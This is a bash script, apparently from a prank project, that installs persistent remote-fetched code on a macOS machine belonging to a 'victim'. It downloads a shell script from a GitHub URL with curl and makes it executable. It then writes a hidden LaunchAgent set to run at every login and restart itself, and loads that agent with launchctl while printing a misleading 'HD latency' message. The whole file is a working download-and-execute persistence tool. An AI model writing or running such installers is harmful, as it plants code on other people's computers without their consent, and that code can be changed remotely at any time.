#!/usr/bin/env bash


victim="$1"


homedir="$HOME"
launchdDir="$homedir/Library/LaunchAgents"
prankDir="$homedir/.prank"

deployLoc="$prankDir/deploy.sh"
deployStdout="$prankDir/deploy.stdout"
deployStderr="$prankDir/deploy.stderr"
deployURL="https://raw.githubusercontent.com/thiesgehrmann/arduinoPranks/master/websiteReactionPrank/deploymentScript.sh"

plistLoc="$launchdDir/prank.plist"

mkdir -p "$launchdDir"
mkdir -p "$prankDir"

curl -s "$deployURL" > "$deployLoc"
chmod +x "$deployLoc"

if [ -e "$plistLoc" ]; then
  launchctl unload "$plistLoc"
fi

cat > "$plistLoc" <<-EOF

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
  <key>Label</key>
  <string>io.github.thiesgehrmann.arduinoPrank</string>
  <key>ProgramArguments</key>
  <array>
    <string>$deployLoc</string>
    <string>$victim</string>
  </array>
  <key>StandardErrorPath</key>
  <string>$deployStderr</string>
  <key>StandardOutPath</key>
  <string>$deployStdout</string>
  <key>RunAtLoad</key>
  <true/>
  <key>KeepAlive</key>
  <true/>
</dict>
</plist>

EOF

echo "Waiting for HD latency."
sleep 2

launchctl load -F "$plistLoc"
